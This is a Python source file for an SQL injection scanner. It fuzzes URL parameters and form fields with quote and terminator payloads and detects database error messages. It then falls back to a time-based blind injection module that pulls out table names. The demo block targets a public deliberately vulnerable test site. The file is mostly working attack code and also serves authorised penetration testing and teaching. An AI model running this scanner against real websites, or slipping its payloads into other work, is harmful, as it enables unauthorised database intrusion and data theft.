from urllib.parse import urlparse
import Blinder
from .forms import *



class sql:
    payloads = ["'", '#', "' FOO"]
    value_terminators = ["'", ";SELECT 1", "%00"]
    # Will used for blind injection later on
    crawled_urls = []
    vulns = []

    def __init__(self, url, cookies=None):
        self.url = url
        self.cookies = cookies

    def identify_url(self):
        url_scheme = urlparse(self.url)
        return url_scheme

    def set_url(self, new_url):
        self.url = new_url

    def fuzz_url(self, url_scheme):
        if self.url not in sql.vulns:
            if url_scheme.query != "":
                for term in sql.value_terminators:
                    link = url_scheme.scheme + "://" + url_scheme.netloc \
                           + url_scheme.path + "?" + url_scheme.query + term
                    content = bs(requests.get(link).content, "html.parser")
                    vulnerability = is_vulnerable(content, link)
                    if not vulnerability and self.url not in sql.vulns:
                        is_blind(self.url)
                    elif vulnerability and self.url not in sql.vulns:
                        print("SQL Injection at {}".format(self.url))
                        sql.vulns.append(self.url)

    def fuzz_Forms(self):
        if self.url not in sql.vulns:
            form_list = forms.get_forms(self.url, self.cookies)
            for form in form_list:
                for P in sql.payloads:
                    response = forms.submit(self.url, form_specs=form, cookies=self.cookies, payload=P)
                    if is_vulnerable(response[0], self.url):
                        sql.vulns.append(self.url)
                        print("SQL Injection at {0} with {1} payload with form {2}".format(self.url, P, form))
                    else:
                        sql.crawled_urls.append(self.url)

    def main(self):
        sql_scanner = sql(self.url, cookies=self.cookies)
        if self.url not in sql.crawled_urls or self.url not in sql.vulns:
            sql_scanner.fuzz_url(url_scheme=sql_scanner.identify_url())
            sql_scanner.fuzz_Forms()


def is_vulnerable(response,url):
    errors = [
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    ]
    decoded_object = response.decode().lower()
    for error in errors:
        if decoded_object.find(error) > -1:
            return True
    return False


def is_blind(url):
    blindCheck = Blinder.blinder(url, sleep=2)
    if blindCheck.check_injection():
        print("Blind SQL Injection at {}".format(url))
        return blindCheck.get_tables()


if __name__ == '__main__':
    sqlscanner = sql("http://testphp.vulnweb.com/userinfo.php", cookies={"login": "test/test"})
    print(is_blind(url="http://testphp.vulnweb.com/listproducts.php?artist=1"))

